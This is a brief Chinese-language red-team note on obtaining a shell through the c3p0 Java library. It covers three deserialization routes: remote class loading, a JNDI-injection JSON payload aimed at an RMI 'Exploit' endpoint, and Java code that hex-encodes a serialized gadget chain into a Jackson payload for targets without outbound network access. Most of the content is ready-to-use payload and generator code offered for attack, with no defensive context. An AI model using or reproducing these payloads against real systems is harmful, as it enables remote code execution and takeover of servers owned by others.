# c3p0有三种方式getshell

## http base

http base适用于原生反序列化

加载远程静态代码和无参构造方法触发

## jndi

jndi适用于jdk8u191以下支持reference情况

```json
{"object":["com.mchange.v2.c3p0.JndiRefForwardingDataSource",{"jndiName":"rmi://localhost:8088/Exploit", "loginTimeout":0}]}
```

## hex序列化字节加载器

hex序列化字节加载器适用于不出网但是目标依赖有gadget链的情况。

其原理是利用jackson的反序列化时调用userOverridesAsString的setter，在setter中运行过程中会把传入的HexAsciiSerializedMap开头的字符串进行解码并触发原生反序列化。

```java
InputStream in = new FileInputStream("C3P0.ser");
byte[] data = toByteArray(in);
in.close();
String HexString = bytesToHexString(data, data.length);
String poc = "{\"object\":[\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",{\"userOverridesAsString\":\"HexAsciiSerializedMap:"+ HexString + ";\"}]}";
System.out.println(poc);

public static byte[] toByteArray(InputStream in) throws IOException {
    byte[] classBytes;
    classBytes = new byte[in.available()];
    in.read(classBytes);
    in.close();
    return classBytes;
}

public static String bytesToHexString(byte[] bArray, int length) {
    StringBuffer sb = new StringBuffer(length);
    for(int i = 0; i < length; ++i) {
        String sTemp = Integer.toHexString(255 & bArray[i]);
        if (sTemp.length() < 2) {
            sb.append(0);
        }

        sb.append(sTemp.toUpperCase());
    }
    return sb.toString();
}
```

## 不出网利用


[JAVA反序列化之C3P0不出网利用](https://mp.weixin.qq.com/s?__biz=MzkzNTI4NjU1Mw==&mid=2247483871&idx=1&sn=56c63dc3f4dc22ad9c61143ee2c484df&chksm=c2b103a9f5c68abfb8e6cb39e81210cce98a3a6850c69b756b7018bc0db829d00af08839d8fc&mpshare=1&scene=23&srcid=1009lg8jEvc5MFXslLojyUud&sharer_sharetime=1644428964407&sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd)


> 参考
>
> http://redteam.today/2020/04/18/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget/

